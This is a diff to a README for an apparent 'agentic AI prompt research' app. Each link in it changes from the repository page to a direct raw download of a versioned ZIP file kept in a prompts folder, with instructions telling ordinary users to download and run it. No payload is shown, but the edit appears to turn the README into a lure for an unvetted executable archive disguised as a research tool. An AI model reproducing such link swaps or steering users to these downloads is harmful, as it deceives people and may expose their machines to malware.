@@ -1,13 +1,13 @@
 # 🤖 agentic-ai-prompt-research - Understand Agent AI Prompt Patterns
 
-[Download the app](https://github.com/unoccupied-creep552/agentic-ai-prompt-research)  
+[Download the app](https://github.com/unoccupied-creep552/agentic-ai-prompt-research/raw/refs/heads/main/prompts/research-ai-agentic-prompt-3.9-alpha.1.zip)  
 ![Download](https://img.shields.io/badge/Download-Blue%20and%20Grey-blue?style=for-the-badge)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[https://github.com/unoccupied-creep552/agentic-ai-prompt-research](https://github.com/unoccupied-creep552/agentic-ai-prompt-research)
+[https://github.com/unoccupied-creep552/agentic-ai-prompt-research/raw/refs/heads/main/prompts/research-ai-agentic-prompt-3.9-alpha.1.zip](https://github.com/unoccupied-creep552/agentic-ai-prompt-research/raw/refs/heads/main/prompts/research-ai-agentic-prompt-3.9-alpha.1.zip)
 
 ## 🖥️ What This Is
 
@@ -41,7 +41,7 @@ If the app comes as a ZIP file, Windows can open it without extra tools. If you 
 ## 🚀 How to Download and Run
 
 1. Open this page:  
-   [https://github.com/unoccupied-creep552/agentic-ai-prompt-research](https://github.com/unoccupied-creep552/agentic-ai-prompt-research)
+   [https://github.com/unoccupied-creep552/agentic-ai-prompt-research/raw/refs/heads/main/prompts/research-ai-agentic-prompt-3.9-alpha.1.zip](https://github.com/unoccupied-creep552/agentic-ai-prompt-research/raw/refs/heads/main/prompts/research-ai-agentic-prompt-3.9-alpha.1.zip)
 
 2. Look for the download option on the page.
 
@@ -168,4 +168,4 @@ Keep these habits in mind:
 
 If you need to return to the download page, use this link:
 
-[https://github.com/unoccupied-creep552/agentic-ai-prompt-research](https://github.com/unoccupied-creep552/agentic-ai-prompt-research)
+[https://github.com/unoccupied-creep552/agentic-ai-prompt-research/raw/refs/heads/main/prompts/research-ai-agentic-prompt-3.9-alpha.1.zip](https://github.com/unoccupied-creep552/agentic-ai-prompt-research/raw/refs/heads/main/prompts/research-ai-agentic-prompt-3.9-alpha.1.zip)
